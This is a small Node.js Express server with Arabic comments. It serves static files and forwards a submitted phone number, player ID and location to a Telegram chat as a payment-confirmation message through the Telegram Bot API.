const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const dotenv = require('dotenv');
const path = require('path'); // استيراد مكتبة path

dotenv.config();

const app = express();
app.use(bodyParser.json());

// خدمة الملفات الثابتة
app.use(express.static(path.join(__dirname, 'public'))); // تعيين مجلد public كملفات ثابتة

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post('/sendPaymentData', async (req, res) => {
    const { phoneNumber, playerID, location } = req.body;
    const message = `Payment confirmed!\nPhone Number: ${phoneNumber}\nPlayer ID: ${playerID}\nLocation: ${location}`;

    try {
        const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
        });

        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error('Error sending message to Telegram:', error);
        res.status(500).json({ success: false, error: 'Failed to send message' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
